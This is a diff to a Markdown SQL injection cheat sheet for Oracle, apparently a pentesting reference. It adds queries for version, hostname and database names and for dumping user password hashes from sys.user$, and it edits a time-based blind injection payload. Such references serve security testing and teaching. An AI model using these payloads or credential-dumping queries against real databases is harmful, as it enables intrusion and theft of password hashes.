@@ -2,8 +2,12 @@
 
 ## Summary
 
-* [Oracle SQL version](#oracle-sql-version)
-* [Oracle SQL database name](#oracle-sql-database-name)
+* [Oracle SQL Default Databases](#oracle-sql-default-databases)
+* [Oracle SQL Comments](#oracle-sql-comments)
+* [Oracle SQL Version](#oracle-sql-version)
+* [Oracle SQL Hostname](#oracle-sql-hostname)
+* [Oracle SQL Database Name](#oracle-sql-database-name)
+* [Oracle SQL Database Credentials](#oracle-sql-database-credentials)
 * [Oracle SQL List databases](#oracle-sql-list-databases)
 * [Oracle SQL List columns](#oracle-sql-list-columns)
 * [Oracle SQL List tables](#oracle-sql-list-tables)
@@ -13,13 +17,42 @@
 * [Oracle SQL Command execution](#oracle-sql-command-execution)
 * [References](#references)
 
-## Oracle SQL version
+
+## Oracle SQL Default Databases
+
+| Name               | Description               |
+|--------------------|---------------------------|
+| SYSTEM             | Available in all versions |
+| SYSAUX             | Available in all versions |
+
+
+## Oracle SQL Comments
+
+| Type                       | Description                       |
+|----------------------------|-----------------------------------|
+| `-- -`                     | SQL comment                       |
+
+
+## Oracle SQL Version
 
 ```sql
 SELECT user FROM dual UNION SELECT * FROM v$version
+SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';
+SELECT banner FROM v$version WHERE banner LIKE 'TNS%';
+SELECT version FROM v$instance;
 ```
 
-## Oracle SQL database name
+## Oracle SQL Hostname
+
+```sql
+SELECT host_name FROM v$instance; (Privileged)
+SELECT UTL_INADDR.get_host_name FROM dual;
+SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual;
+SELECT UTL_INADDR.get_host_address FROM dual;
+```
+
+
+## Oracle SQL Database Name
 
 ```sql
 SELECT global_name FROM global_name;
@@ -27,6 +60,15 @@ SELECT name FROM V$DATABASE;
 SELECT instance_name FROM V$INSTANCE;
 SELECT SYS.DATABASE_NAME FROM DUAL;
 ```
+
+## Oracle SQL Database Credentials
+
+| Query                                   | Description               |
+|-----------------------------------------|---------------------------|
+| `SELECT username FROM all_users;`       | Available on all versions |
+| `SELECT name, password from sys.user$;` | Privileged, <= 10g        |
+| `SELECT name, spare4 from sys.user$;`   | Privileged, <= 11g        |
+
 
 ## Oracle SQL List Databases
 
@@ -71,11 +113,13 @@ SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';
 | Column message exists in table log_table | SELECT COUNT(*) FROM user_tab_cols WHERE column_name = 'MESSAGE' AND table_name = 'LOG_TABLE'; |
 | First letter of first message is t | SELECT message FROM log_table WHERE rownum=1 AND message LIKE 't%'; |
 
+
 ## Oracle SQL Time based
 
 ```sql
-AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])                 comment:   -- /**/
+AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) 
 ```
+
 
 ## Oracle SQL Command Execution
 
@@ -141,3 +185,4 @@ SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;
 * [ASDC12 - New and Improved Hacking Oracle From Web](https://owasp.org/www-pdf-archive/ASDC12-New_and_Improved_Hacking_Oracle_From_Web.pdf)
 * [Pentesting Oracle TNS Listener - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener)
 * [ODAT: Oracle Database Attacking Tool](https://github.com/quentinhardy/odat/wiki/privesc)
+* [WebSec CheatSheet - Oracle](https://www.websec.ca/kb/sql_injection#Oracle_Default_Databases)
